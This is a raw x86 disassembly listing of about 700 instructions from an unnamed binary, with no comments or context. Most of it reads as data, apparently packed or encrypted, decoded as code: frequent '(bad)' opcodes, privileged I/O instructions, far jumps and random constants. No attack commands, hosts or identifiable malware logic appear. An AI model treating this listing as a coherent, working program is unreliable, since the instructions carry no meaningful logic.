  41c02e:	inc    edx
  41c02f:	add    DWORD PTR [esi+ebp*8+0x68],ebp
  41c033:	cmc    
  41c034:	js     0x41c01a
  41c036:	sbb    ebp,DWORD PTR [edx+0x56cfcb8b]
  41c03c:	not    BYTE PTR [edx+0x1ed189e1]
  41c042:	lock lods eax,DWORD PTR ds:[esi]
  41c044:	sub    edx,ebx
  41c046:	test   BYTE PTR [edx],bl
  41c048:	scas   al,BYTE PTR es:[edi]
  41c049:	sbb    al,0x5f
  41c04b:	xor    DWORD PTR [edi],edx
  41c04d:	adc    eax,0xfa006a63
  41c052:	mov    ch,bl
  41c054:	inc    ebx
  41c055:	jns    0x41c09c
  41c057:	jne    0x41c068
  41c059:	scas   al,BYTE PTR es:[edi]
  41c05a:	lahf   
  41c05b:	js     0x41c000
  41c05d:	jns    0x41c0ce
  41c05f:	gs retf 
  41c061:	jl     0x41c071
  41c063:	es inc esp
  41c065:	scas   eax,DWORD PTR es:[edi]
  41c066:	imul   BYTE PTR [ebx-0x4c7e276f]
  41c06c:	mov    bl,0x38
  41c06e:	mov    ch,0x2d
  41c070:	mov    dl,cl
  41c072:	in     eax,0xa3
  41c074:	add    BYTE PTR [edi-0x66],al
  41c077:	sbb    al,0x5d
  41c079:	ds mov ebx,0x71400d0d
  41c07f:	retf   
  41c080:	in     eax,0x57
  41c082:	jmp    0xf4af:0xcf055357
  41c089:	test   al,0x36
  41c08b:	leave  
  41c08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08d:	(bad)  
  41c08e:	cld    
  41c08f:	xor    ebx,ecx
  41c091:	sbb    ah,bh
  41c093:	ret    
  41c094:	sbb    ecx,esi
  41c096:	mov    dh,0x85
  41c098:	mov    esp,0xb7bb0867
  41c09d:	mov    ss,WORD PTR [ecx-0x78]
  41c0a0:	dec    ebx
  41c0a1:	dec    edx
  41c0a2:	sub    al,0xad
  41c0a4:	dec    ebp
  41c0a5:	ss stos BYTE PTR es:[edi],al
  41c0a7:	(bad)  
  41c0a8:	rcr    BYTE PTR [eax],cl
  41c0aa:	mov    dh,0xc2
  41c0ac:	cdq    
  41c0ad:	imul   edi,ecx,0x669f41b5
  41c0b3:	adc    cl,ah
  41c0b5:	out    dx,al
  41c0b6:	dec    esi
  41c0b7:	mov    edi,0xc0d3514a
  41c0bc:	call   0x49d3502c
  41c0c1:	lahf   
  41c0c2:	cmp    ebx,DWORD PTR [ebx-0x13]
  41c0c5:	das    
  41c0c6:	xlat   BYTE PTR ds:[ebx]
  41c0c7:	pop    ebx
  41c0c8:	mov    ds:0x6fe99e4d,eax
  41c0cd:	sbb    eax,0x2bda28f6
  41c0d2:	pop    ds
  41c0d3:	xor    al,0xd9
  41c0d5:	adc    ecx,ebp
  41c0d7:	lock jge 0x41c11f
  41c0da:	pop    ebx
  41c0db:	xchg   ebx,eax
  41c0dc:	in     eax,dx
  41c0dd:	sbb    al,0xd0
  41c0df:	fadd   QWORD PTR [edx]
  41c0e1:	jle    0x41c0ce
  41c0e3:	test   DWORD PTR [ebx+0x33],0x730f0def
  41c0ea:	call   0x6ff9674e
  41c0ef:	xchg   ecx,eax
  41c0f0:	leave  
  41c0f1:	add    bh,dl
  41c0f3:	mov    bl,0x51
  41c0f5:	xchg   esi,eax
  41c0f6:	clc    
  41c0f7:	enter  0x7fb0,0xa0
  41c0fb:	fidivr DWORD PTR [ecx-0x49]
  41c0fe:	adc    al,0x21
  41c100:	jo     0x41c111
  41c102:	iret   
  41c103:	jne    0x41c17c
  41c105:	popa   
  41c106:	popa   
  41c107:	mov    esi,0xe73e9f62
  41c10c:	das    
  41c10d:	mov    ebp,?
  41c10f:	retf   0xb67
  41c112:	pop    esp
  41c113:	mov    ebx,0x4fc9f29c
  41c118:	sahf   
  41c119:	pop    eax
  41c11a:	push   0xf8d37146
  41c11f:	mov    ebp,0xa9e9b6e8
  41c124:	xor    DWORD PTR [edi],0x7e
  41c127:	pusha  
  41c128:	or     al,0xd1
  41c12a:	or     dh,BYTE PTR [ecx]
  41c12c:	mov    ecx,0x2b29bbc3
  41c131:	(bad)  
  41c133:	in     eax,0x48
  41c135:	pop    es
  41c136:	inc    ebp
  41c137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c138:	or     BYTE PTR [edx],0xc0
  41c13b:	add    ebx,DWORD PTR [eax]
  41c13d:	scas   eax,DWORD PTR es:[edi]
  41c13e:	mov    DWORD PTR [edi],esi
  41c140:	pop    eax
  41c141:	lods   al,BYTE PTR ds:[esi]
  41c142:	scas   al,BYTE PTR es:[edi]
  41c143:	sub    BYTE PTR [esi+0x50],bh
  41c146:	or     ecx,eax
  41c148:	fnsave [esi+0x5a]
  41c14b:	popa   
  41c14c:	add    DWORD PTR [ebx+0x49fd721],ebx
  41c152:	int    0xe9
  41c154:	push   eax
  41c155:	fwait
  41c156:	adc    BYTE PTR [ecx-0x12],al
  41c159:	stos   DWORD PTR es:[edi],eax
  41c15a:	or     al,0x6e
  41c15c:	xor    eax,0xb0dafa5f
  41c161:	dec    edi
  41c162:	(bad)  
  41c163:	or     al,BYTE PTR [ecx+0x18c53b0c]
  41c169:	sbb    BYTE PTR [esi],dl
  41c16b:	sbb    ecx,DWORD PTR [edx+0x7b418a22]
  41c171:	rcl    DWORD PTR [eax+esi*4+0x8],cl
  41c175:	aaa    
  41c176:	ss test eax,0xd9e167aa
  41c17c:	les    edx,FWORD PTR [ebx-0x5274eb90]
  41c182:	xchg   edi,eax
  41c183:	call   0x47b5:0xeb4112f9
  41c18a:	jb     0x41c10e
  41c18c:	mov    ebx,DWORD PTR [ebx]
  41c18e:	mov    esp,0xf060006
  41c193:	add    ecx,DWORD PTR [edi+0x11003d3]
  41c199:	(bad)  
  41c19a:	hlt    
  41c19b:	lds    edi,FWORD PTR ds:0x5dde5a86
  41c1a1:	sbb    DWORD PTR es:[edi-0x62],esp
  41c1a5:	xor    BYTE PTR [ebp-0x70],bh
  41c1a8:	pop    esi
  41c1a9:	pop    eax
  41c1aa:	sbb    al,0xae
  41c1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ae:	jecxz  0x41c1b3
  41c1b0:	dec    edi
  41c1b1:	retf   
  41c1b2:	and    esp,edx
  41c1b4:	scas   al,BYTE PTR es:[edi]
  41c1b5:	int3   
  41c1b6:	jmp    0xb7b8:0xa539bc8e
  41c1bd:	push   cs
  41c1be:	test   al,0xa8
  41c1c0:	dec    ebp
  41c1c1:	xor    BYTE PTR [eax+edi*1],0x12
  41c1c5:	inc    edx
  41c1c6:	aad    0xb
  41c1c8:	jg     0x41c239
  41c1ca:	mov    ebx,DWORD PTR [ebx-0x71ee70a4]
  41c1d0:	xlat   BYTE PTR ds:[ebx]
  41c1d1:	add    cl,0xb6
  41c1d4:	push   ds
  41c1d5:	rcl    DWORD PTR [ebx+0x18ebbd9e],0xff
  41c1dc:	lds    eax,FWORD PTR [ebp+0x28ea112e]
  41c1e2:	mov    ah,0x88
  41c1e4:	lea    esi,[esi-0x23d896c3]
  41c1ea:	xchg   ecx,eax
  41c1eb:	add    BYTE PTR [esi-0x1dddcf75],0xa1
  41c1f2:	push   edx
  41c1f3:	add    edi,edi
  41c1f5:	jmp    0x5a92e047
  41c1fa:	pop    ebx
  41c1fb:	mov    ch,0x2b
  41c1fd:	push   ebp
  41c1fe:	inc    esp
  41c1ff:	jb     0x41c203
  41c201:	cs sbb al,0x6e
  41c204:	das    
  41c205:	aad    0x62
  41c207:	mov    ah,0x21
  41c209:	jnp    0x41c244
  41c20b:	cmp    al,0x84
  41c20d:	mov    edi,0xd6e39fd4
  41c212:	arpl   WORD PTR [ecx],di
  41c214:	mov    esp,0xd88f2766
  41c219:	mov    edx,0xd902f445
  41c21e:	shl    DWORD PTR [edi+0x677e103d],0x52
  41c225:	add    eax,0xb804f8c7
  41c22a:	mov    edx,0xaee806ec
  41c22f:	ss adc bh,bl
  41c232:	iret   
  41c233:	mov    esi,gs
  41c235:	pop    esi
  41c236:	and    eax,0x12a18e87
  41c23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c23c:	cli    
  41c23d:	out    0x32,eax
  41c23f:	jbe    0x41c2bb
  41c241:	xor    eax,0x2d86027a
  41c246:	or     BYTE PTR [edi+0x11cbc3ca],ah
  41c24c:	fisttp QWORD PTR ds:0x9e0fa1fa
  41c252:	retf   
  41c253:	adc    edi,DWORD PTR [esi-0x57]
  41c256:	pop    edx
  41c257:	(bad)  
  41c258:	loop   0x41c23b
  41c25a:	lds    ebx,FWORD PTR [edi]
  41c25c:	mov    edi,0xc0eb614
  41c261:	mov    ds:0xb9459b8b,eax
  41c266:	stos   BYTE PTR es:[edi],al
  41c267:	cs sub al,0xc2
  41c26a:	sbb    edi,DWORD PTR [edi]
  41c26c:	push   esp
  41c26d:	pop    eax
  41c26e:	fmul   QWORD PTR [ecx]
  41c270:	fld    TBYTE PTR [ebp-0x3874a611]
  41c276:	call   0x1beb:0x215aebf6
  41c27d:	pop    esp
  41c27e:	xor    edx,ebp
  41c280:	mov    ax,0x2a54
  41c284:	jb     0x41c2a9
  41c286:	adc    eax,0x9ba7721f
  41c28b:	jmp    0x41c243
  41c28d:	mov    cl,BYTE PTR [eax-0x35ad56a]
  41c293:	fdiv   st(6),st
  41c295:	in     eax,0x50
  41c297:	daa    
  41c298:	out    dx,al
  41c299:	es fsubrp st(3),st
  41c29c:	mov    esp,esi
  41c29e:	jge    0x41c255
  41c2a0:	inc    esp
  41c2a1:	xor    al,0x84
  41c2a3:	inc    ecx
  41c2a4:	mov    ecx,0xf7b8940
  41c2a9:	xlat   BYTE PTR ds:[ebx]
  41c2aa:	sub    edx,esp
  41c2ac:	jb     0x41c26d
  41c2ae:	mov    cl,0xfa
  41c2b0:	ret    0x7221
  41c2b3:	popf   
  41c2b4:	adc    al,0x64
  41c2b6:	sti    
  41c2b7:	cs and al,0xac
  41c2ba:	push   esp
  41c2bb:	add    esi,DWORD PTR [eax-0x9]
  41c2be:	ins    BYTE PTR es:[edi],dx
  41c2bf:	xor    bh,0xbb
  41c2c2:	std    
  41c2c3:	pushf  
  41c2c4:	jae    0x41c287
  41c2c6:	mov    edi,eax
  41c2c8:	ds cmp ch,al
  41c2cb:	xlat   BYTE PTR ds:[ebx]
  41c2cc:	imul   ebp,DWORD PTR [edx+0x1a832a24],0xffffffaf
  41c2d3:	sbb    bh,BYTE PTR [esi+0xa]
  41c2d6:	and    eax,0xbd2f2efe
  41c2db:	fisubr WORD PTR ds:0xb0274e54
  41c2e1:	in     eax,0x3a
  41c2e3:	inc    ebp
  41c2e4:	sbb    al,0x2b
  41c2e6:	and    cl,BYTE PTR [esi+ebx*2]
  41c2e9:	imul   edi,esp,0x53
  41c2ec:	push   es
  41c2ed:	or     bh,BYTE PTR [ebp+0x1a54a55d]
  41c2f3:	push   DWORD PTR [ebx+0x38]
  41c2f6:	enter  0x92e7,0x7
  41c2fa:	lds    ecx,FWORD PTR [ecx]
  41c2fc:	fsub   st,st(1)
  41c2fe:	jmp    0xe04e:0xd112022
  41c305:	rol    DWORD PTR [ebp+ecx*8+0xa],0x78
  41c30a:	outs   dx,DWORD PTR ds:[esi]
  41c30b:	bound  ebp,QWORD PTR [esi]
  41c30d:	mov    ebx,0x4b84e7a8
  41c312:	pusha  
  41c313:	xor    BYTE PTR ds:0x9c203a45,cl
  41c319:	arpl   WORD PTR [ebx],bp
  41c31b:	xor    bl,BYTE PTR [edi+0x0]
  41c31e:	add    eax,DWORD PTR [eax-0x49]
  41c321:	add    eax,0x91730ff5
  41c326:	push   esp
  41c327:	adc    eax,edx
  41c329:	shl    DWORD PTR [eax],0xbd
  41c32c:	sub    eax,0x478ccc86
  41c331:	dec    esi
  41c332:	jecxz  0x41c31c
  41c334:	popf   
  41c335:	dec    DWORD PTR [edx]
  41c337:	lds    esp,FWORD PTR [ebp-0x50]
  41c33a:	cli    
  41c33b:	xchg   ebx,eax
  41c33c:	aam    0xd1
  41c33e:	pusha  
  41c33f:	fsubr  DWORD PTR [edx+0x34]
  41c342:	sti    
  41c343:	or     DWORD PTR [ecx+0x3a175ca3],ecx
  41c349:	mov    al,ds:0x2703728e
  41c34e:	add    DWORD PTR [edi],esp
  41c350:	pusha  
  41c351:	sahf   
  41c352:	mov    al,ds:0x46c660a9
  41c357:	mov    ecx,ecx
  41c359:	cmp    al,0x34
  41c35b:	ds pop ss
  41c35d:	imul   esi,DWORD PTR [esi+0x4e],0x1d272d99
  41c364:	and    BYTE PTR [ebp+0x59],dl
  41c367:	call   0xc16f8a0e
  41c36c:	in     al,dx
  41c36d:	loopne 0x41c344
  41c36f:	outs   dx,DWORD PTR ds:[esi]
  41c370:	mov    esi,0xf12f0407
  41c375:	mov    al,ds:0xc15dc5d3
  41c37a:	push   ds
  41c37b:	mov    DWORD PTR [edi-0x4ecc0ae5],edx
  41c381:	out    dx,al
  41c382:	enter  0xafaf,0xe
  41c386:	iret   
  41c387:	inc    edx
  41c388:	add    DWORD PTR [esi],ebx
  41c38a:	leave  
  41c38b:	or     DWORD PTR [esi],0x1e1ae46a
  41c391:	jecxz  0x41c350
  41c393:	lock sub edx,DWORD PTR [ebp+0x7827271a]
  41c39a:	mov    es,WORD PTR [edx]
  41c39c:	push   ebx
  41c39d:	(bad)  
  41c39e:	in     eax,dx
  41c39f:	dec    ebx
  41c3a0:	in     al,0x1a
  41c3a2:	mov    ebp,0xd919c613
  41c3a7:	mov    dh,0x78
  41c3a9:	or     ebp,edx
  41c3ab:	leave  
  41c3ac:	push   ebx
  41c3ad:	in     al,dx
  41c3ae:	call   0x5c87ac7d
  41c3b3:	aad    0xfe
  41c3b5:	mov    bl,0xf3
  41c3b7:	lahf   
  41c3b8:	(bad)  
  41c3b9:	sti    
  41c3ba:	sahf   
  41c3bb:	sub    eax,DWORD PTR [ebp+0x6f]
  41c3be:	(bad)  
  41c3bf:	cs push edi
  41c3c1:	mov    esi,0x8024340c
  41c3c6:	js     0x41c437
  41c3c8:	sub    ah,0x7e
  41c3cb:	jbe    0x41c370
  41c3cd:	out    0x98,eax
  41c3cf:	add    BYTE PTR [eax+0xf],ah
  41c3d2:	js     0x41c3f3
  41c3d4:	out    0x7c,al
  41c3d6:	add    al,0x5a
  41c3d8:	lds    edx,FWORD PTR [ebx+0x7034148e]
  41c3de:	pop    ebp
  41c3df:	test   BYTE PTR [ebx+ebp*1],bh
  41c3e2:	fwait
  41c3e3:	nop
  41c3e4:	cwde   
  41c3e5:	dec    ebp
  41c3e6:	loope  0x41c3f1
  41c3e8:	je     0x41c42c
  41c3ea:	cmp    ch,dl
  41c3ec:	fild   WORD PTR [ebx+edi*8-0x57]
  41c3f0:	ret    0x8949
  41c3f3:	jmp    0x7456:0xfa40051a
  41c3fa:	cvtdq2ps xmm4,XMMWORD PTR [ecx+0x1]
  41c3fe:	xchg   esi,eax
  41c3ff:	out    dx,al
  41c400:	mov    ah,0x79
  41c402:	test   al,0x3d
  41c404:	mov    BYTE PTR [esi],dh
  41c406:	xchg   DWORD PTR [edi-0x585ae14],esp
  41c40c:	push   esi
  41c40d:	push   0xfffffff6
  41c40f:	jbe    0x41c425
  41c411:	jmp    0xa332b3b3
  41c416:	xor    eax,0x1a3c8450
  41c41b:	sub    eax,0x22edada9
  41c420:	sbb    BYTE PTR [ebx+eax*2+0x68],bl
  41c424:	ins    BYTE PTR es:[edi],dx
  41c425:	fcmovnbe st,st(3)
  41c427:	arpl   WORD PTR [edi+0xe2eb81b],sp
  41c42d:	adc    eax,0xc165e31c
  41c432:	shl    ebx,cl
  41c434:	cli    
  41c435:	je     0x41c3dc
  41c437:	push   ds
  41c438:	jg     0x41c440
  41c43a:	mov    ds:0x2c06e6b3,al
  41c43f:	dec    ebx
  41c440:	mov    ecx,0xcd3912db
  41c445:	icebp  
  41c446:	mov    cl,0x56
  41c448:	stc    
  41c449:	add    DWORD PTR [ebx-0x10c73c28],ecx
  41c44f:	aad    0x9e
  41c451:	lods   al,BYTE PTR ds:[esi]
  41c452:	ret    
  41c453:	shl    DWORD PTR [ecx-0x46],1
  41c456:	xor    DWORD PTR [eax+ebp*1-0x52],edi
  41c45a:	jbe    0x41c3f0
  41c45c:	(bad)  
  41c45d:	mov    al,0xf4
  41c45f:	cwde   
  41c460:	(bad)  
  41c461:	mov    bh,0xd0
  41c463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c464:	xchg   esp,eax
  41c465:	sub    eax,0x99816234
  41c46a:	int    0xb4
  41c46c:	or     ebp,DWORD PTR [edi-0x291dbcd7]
  41c472:	loopne 0x41c469
  41c474:	jo     0x41c443
  41c476:	loope  0x41c46b
  41c478:	aad    0x9b
  41c47a:	mov    eax,ds:0x8650d096
  41c47f:	fbstp  TBYTE PTR [ecx+0x4d334336]
  41c485:	xor    DWORD PTR [edi+0x37],edx
  41c488:	fnstcw WORD PTR [ecx]
  41c48a:	in     eax,0xfe
  41c48c:	jnp    0x41c467
  41c48e:	scas   al,BYTE PTR es:[edi]
  41c48f:	(bad)  
  41c490:	sbb    eax,0x5a94755a
  41c495:	add    ecx,DWORD PTR [edx]
  41c497:	cmc    
  41c498:	test   al,0x95
  41c49a:	cdq    
  41c49b:	xor    al,0x58
  41c49d:	xchg   BYTE PTR [edi+eax*8],dh
  41c4a0:	or     DWORD PTR [ebp+0x57],ecx
  41c4a3:	or     BYTE PTR [esi+0x407790b],0x88
  41c4aa:	pushf  
  41c4ab:	repz and ebx,edi
  41c4ae:	sub    DWORD PTR ds:0x3f69aa,edi
  41c4b4:	shld   DWORD PTR [eax+0x56985a68],ecx,0x78
  41c4bc:	fs into 
  41c4be:	into   
  41c4bf:	jge    0x41c4d7
  41c4c1:	mov    esp,DWORD PTR [eax+0x315d7622]
  41c4c7:	and    al,0xa2
  41c4c9:	das    
  41c4ca:	in     eax,dx
  41c4cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4cc:	xor    eax,0x3c82b542
  41c4d1:	mov    WORD PTR [eax+ebx*8+0x57],?
  41c4d5:	outs   dx,BYTE PTR ds:[esi]
  41c4d6:	dec    ebx
  41c4d7:	int3   
  41c4d8:	bound  eax,QWORD PTR [ecx+0x79419a50]
  41c4de:	and    eax,0x51521e56
  41c4e3:	xlat   BYTE PTR ds:[ebx]
  41c4e4:	mov    ds,WORD PTR [ebx-0xf]
  41c4e7:	dec    ebx
  41c4e8:	je     0x41c549
  41c4ea:	aad    0xe1
  41c4ec:	sar    BYTE PTR [ebx+esi*2],cl
  41c4ef:	call   0x2785b0bd
  41c4f4:	mov    DWORD PTR [eax],eax
  41c4f6:	cmp    al,0x24
  41c4f8:	es pop edi
  41c4fa:	addr16 ret 
  41c4fc:	scas   eax,DWORD PTR es:[edi]
  41c4fd:	add    DWORD PTR [di+0x77],ecx
  41c501:	sbb    eax,0x83c1285f
  41c506:	jp     0x41c49f
  41c508:	(bad)  
  41c509:	push   ebx
  41c50a:	push   edi
  41c50b:	punpckhdq mm7,QWORD PTR [ebp+edi*1-0x37d3ae0c]
  41c513:	dec    ebx
  41c514:	inc    edx
  41c515:	jecxz  0x41c549
  41c517:	mov    eax,0xcc62256e
  41c51c:	cmp    DWORD PTR [ebp-0x7f],edx
  41c51f:	aas    
  41c520:	sub    eax,0xf781dcc2
  41c525:	imul   DWORD PTR [ebx-0x7c]
  41c528:	lods   al,BYTE PTR ds:[esi]
  41c529:	(bad)  
  41c52a:	mov    ebp,0xefec264c
  41c52f:	pop    esp
  41c530:	aad    0xff
  41c532:	cmp    dh,ch
  41c534:	fidiv  DWORD PTR [ecx-0x12]
  41c537:	loopne 0x41c4c0
  41c539:	not    BYTE PTR [ebx-0x423dfb13]
  41c53f:	dec    ebp
  41c540:	ja     0x41c565
  41c542:	scas   eax,DWORD PTR es:[edi]
  41c543:	div    DWORD PTR [edi]
  41c545:	in     al,dx
  41c546:	mov    al,0x31
  41c548:	pushf  
  41c549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c54a:	pop    es
  41c54b:	add    eax,0x9136d784
  41c550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c551:	push   es
  41c552:	add    BYTE PTR [ecx],bh
  41c554:	sete   BYTE PTR [eax+0x78]
  41c558:	jg     0x41c4ff
  41c55a:	in     eax,0x2a
  41c55c:	inc    esp
  41c55d:	add    BYTE PTR [ebx],0xe2
  41c560:	push   ebp
  41c561:	in     al,0x11
  41c563:	loope  0x41c546
  41c565:	lods   eax,DWORD PTR ds:[esi]
  41c566:	inc    ecx
  41c567:	jmp    0x9de5:0x3de94c08
  41c56e:	pop    ds
  41c56f:	sbb    al,0xf2
  41c571:	add    BYTE PTR [edi],cl
  41c573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c574:	and    ebx,DWORD PTR [ebp-0x6a]
  41c577:	inc    esi
  41c578:	inc    esi
  41c579:	aas    
  41c57a:	leave  
  41c57b:	shr    DWORD PTR [edx-0x4a5728e0],1
  41c581:	inc    eax
  41c582:	push   0xae5f2239
  41c587:	mov    ds:0xd419bb10,eax
  41c58c:	stc    
  41c58d:	mov    esp,0xb5229ba4
  41c592:	ins    BYTE PTR es:[edi],dx
  41c593:	jp     0x41c561
  41c595:	sub    ebx,esi
  41c597:	push   cs
  41c598:	aaa    
  41c599:	add    DWORD PTR [esi-0x61d7d10e],0x8
  41c5a0:	adc    bl,BYTE PTR [esi+0x421527bf]
  41c5a6:	mov    dl,0xd0
  41c5a8:	mov    ecx,DWORD PTR [ecx]
  41c5aa:	aas    
  41c5ab:	dec    esi
  41c5ac:	loopne 0x41c587
  41c5ae:	add    al,0xdd
  41c5b0:	cmp    ebx,DWORD PTR [ecx]
  41c5b2:	mov    ecx,DWORD PTR [ebp-0xab117c9]
  41c5b8:	mov    eax,0xf6eb996e
  41c5bd:	pop    edx
  41c5be:	in     eax,dx
  41c5bf:	pop    ebx
  41c5c0:	cli    
  41c5c1:	fisttp DWORD PTR [esi]
  41c5c3:	mov    esp,0x17a810d0
  41c5c8:	stc    
  41c5c9:	test   eax,0xfd778c3
  41c5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5cf:	inc    ebx
  41c5d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5d1:	out    dx,al
  41c5d2:	pushf  
  41c5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5d4:	pushf  
  41c5d5:	loope  0x41c5bf
  41c5d7:	(bad)  
  41c5d8:	pop    eax
  41c5d9:	push   esi
  41c5da:	adc    eax,0x6ee7d6c0
  41c5df:	jp     0x41c5d6
  41c5e1:	out    0x79,al
  41c5e3:	mov    edx,0x349dea65
  41c5e8:	and    eax,0x87cc456
  41c5ed:	xchg   edx,eax
  41c5ee:	add    al,0x8c
  41c5f0:	in     eax,dx
  41c5f1:	jb     0x41c5e0
  41c5f3:	pop    eax
  41c5f4:	(bad)  
  41c5f5:	sbb    BYTE PTR [edx+0x50],bh
  41c5f8:	xchg   ebp,eax
  41c5f9:	aas    
  41c5fa:	test   DWORD PTR [ebx+0x6d6b27ff],edx
  41c600:	test   eax,0xec083ebe
  41c605:	clc    
  41c606:	(bad)  
  41c607:	retf   0x64d5
  41c60a:	jno    0x41c630
  41c60c:	fdiv   DWORD PTR [ebx-0x78]
  41c60f:	out    dx,al
  41c610:	test   eax,0xf2489efd
  41c615:	cdq    
  41c616:	imul   esp,DWORD PTR [edi-0x8],0xffffffee
  41c61a:	fdiv   DWORD PTR [ebx]
  41c61c:	test   DWORD PTR ds:0x7a847e3d,ebx
  41c622:	mov    ds:0xd945b442,al
  41c627:	lahf   
  41c628:	jecxz  0x41c6a2
  41c62a:	aaa    
  41c62b:	adc    al,0xe3
  41c62d:	aad    0x60
  41c62f:	push   edx
  41c630:	add    al,0x4e
  41c632:	test   DWORD PTR [ebx+0x791a6918],0x22ed4ce8
  41c63c:	sbb    eax,0x38a611a4
  41c641:	imul   edi,esp,0xc1ad45e
  41c647:	(bad)  
  41c648:	out    dx,al
  41c649:	inc    edi
  41c64a:	sbb    edi,DWORD PTR [edx+0x18dde859]
  41c650:	pop    edx
  41c651:	test   BYTE PTR [eax+0xe],dl
  41c654:	adc    DWORD PTR [esi-0x3b46357a],edx
  41c65a:	xor    ch,ah
  41c65c:	jp     0x41c633
  41c65e:	cmp    DWORD PTR [ebp+0x5b],ecx
  41c661:	jb     0x41c6c3
  41c663:	sub    al,0x4c
  41c665:	in     al,dx
  41c666:	int    0x6c
  41c668:	pop    ecx
  41c669:	daa    
  41c66a:	sbb    BYTE PTR [ebx+0x2cca6921],0xe6
  41c671:	jmp    0x90bc90cb
  41c676:	(bad)  
  41c677:	cld    
  41c678:	fld    TBYTE PTR [ecx]
  41c67a:	push   ecx
  41c67b:	outs   dx,DWORD PTR ds:[esi]
  41c67c:	or     al,0x26
  41c67e:	mov    ch,0xf9
  41c680:	mov    dh,BYTE PTR [ebp-0x47]
  41c683:	or     ah,BYTE PTR [eax-0x2ef4d576]
  41c689:	sub    DWORD PTR [ecx],esi
  41c68b:	dec    esp
  41c68c:	xchg   ecx,eax
  41c68d:	sub    ch,dl
  41c68f:	inc    esp
  41c690:	adc    BYTE PTR [eax+ecx*2-0x37],cl
  41c694:	cmp    ebx,ecx
  41c696:	mov    fs,ebp
  41c698:	jns    0x41c640
  41c69a:	pop    esi
  41c69b:	or     dh,BYTE PTR [ecx+0x4a33351e]
  41c6a1:	inc    eax
  41c6a2:	icebp  
  41c6a3:	hlt    
  41c6a4:	scas   al,BYTE PTR es:[edi]
  41c6a5:	pop    ebx
  41c6a6:	aad    0xde
  41c6a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6a9:	pop    edx
  41c6aa:	inc    edx
  41c6ab:	loop   0x41c671
  41c6ad:	lahf   
  41c6ae:	sub    al,BYTE PTR [ecx+0x6a]
  41c6b1:	mov    esi,0x3bb19a0a
  41c6b6:	sub    cl,bl
  41c6b8:	das    
  41c6b9:	ds dec eax
  41c6bb:	in     eax,0xe4
  41c6bd:	stos   DWORD PTR es:[edi],eax
  41c6be:	(bad)  
  41c6bf:	mov    bh,0x92
  41c6c1:	rep outs dx,DWORD PTR ds:[esi]
  41c6c3:	sub    dl,ah
  41c6c5:	or     ch,BYTE PTR [esi-0x3a]
  41c6c8:	shl    DWORD PTR ds:0xa427172d,cl
  41c6ce:	jge    0x41c6db
  41c6d0:	pop    eax
  41c6d1:	repnz xchg esp,eax
  41c6d3:	sbb    edi,esp
  41c6d5:	mov    bl,0xb4
  41c6d7:	inc    eax
  41c6d8:	mov    bh,0x28
  41c6da:	ffreep st(5)
  41c6dc:	paddw  mm2,QWORD PTR [ebx]
  41c6df:	stos   BYTE PTR es:[edi],al
  41c6e0:	ja     0x41c70d
  41c6e2:	dec    esi
  41c6e3:	inc    ebx
  41c6e4:	mov    edx,0x49c7361e
  41c6e9:	lds    esp,FWORD PTR [edi-0x43]
  41c6ec:	outs   dx,DWORD PTR ds:[esi]
  41c6ed:	push   ebp
  41c6ee:	mov    dh,0xac
  41c6f0:	push   0xffffffde
  41c6f2:	pop    esp
  41c6f3:	neg    BYTE PTR [esi+ecx*2]
  41c6f6:	pop    ebp
  41c6f7:	sbb    al,ch
  41c6f9:	mov    esp,0xa3774b64
  41c6fe:	outs   dx,BYTE PTR ds:[esi]
  41c6ff:	xchg   edx,eax
  41c700:	sbb    ebx,edx
  41c702:	icebp  
  41c703:	and    BYTE PTR [esi],bl
  41c705:	int3   
  41c706:	mov    DWORD PTR [esi],esi
  41c708:	cmp    al,al
  41c70a:	adc    ebp,0x93217916
  41c710:	int3   
  41c711:	(bad)  
  41c712:	mov    cl,0x90
  41c714:	add    bl,al
  41c716:	mov    ah,0xa3
  41c718:	(bad)  
  41c719:	mov    ch,0x37
  41c71b:	retf   
  41c71c:	sar    bh,0x45
  41c71f:	and    DWORD PTR [ebx+0x3b4a6b5a],ebp
  41c725:	mov    ecx,DWORD PTR [ebx+0x5e]
  41c728:	stos   BYTE PTR es:[edi],al
  41c729:	imul   edi,DWORD PTR [ebp+0x1],0x6f629f57
  41c730:	das    
  41c731:	sbb    al,0x9f
  41c733:	push   ecx
  41c734:	jbe    0x41c70b
  41c736:	imul   ecx,DWORD PTR [ecx+0x11],0xffffffa9
  41c73a:	mov    ds:0x1a4b7673,eax
  41c73f:	push   esp
  41c740:	and    edx,0xef943fbc
  41c746:	sbb    al,0xaf
  41c748:	cli    
  41c749:	(bad)  
  41c74a:	or     dh,cl
  41c74c:	sbb    bh,bh
  41c74e:	das    
  41c74f:	and    BYTE PTR ds:0xba4a8a14,dh
  41c755:	or     eax,DWORD PTR [edi+0x64bb7480]
  41c75b:	xchg   esp,eax
  41c75c:	aad    0x24
  41c75e:	div    DWORD PTR [eax+0x2e]
  41c761:	aaa    
  41c762:	push   esi
  41c763:	je     0x41c74e
  41c765:	lods   al,BYTE PTR ds:[esi]
  41c766:	out    0x84,eax
  41c768:	test   al,0xc6
  41c76a:	ds cmp al,0xc1
  41c76d:	arpl   WORD PTR [edx],di
  41c76f:	add    ebx,DWORD PTR [edx-0x27]
  41c772:	jg     0x41c795
  41c774:	cs push ebp
  41c776:	xlat   BYTE PTR ds:[ebx]
  41c777:	arpl   WORD PTR [edx],bp
  41c779:	lds    esi,FWORD PTR [ebx+0x1a7006e6]
  41c77f:	arpl   WORD PTR [ebp+0xe],sp
  41c782:	xchg   ebp,eax
  41c783:	ss push 0x73
  41c786:	jb     0x41c777
  41c788:	fld    DWORD PTR [eax]
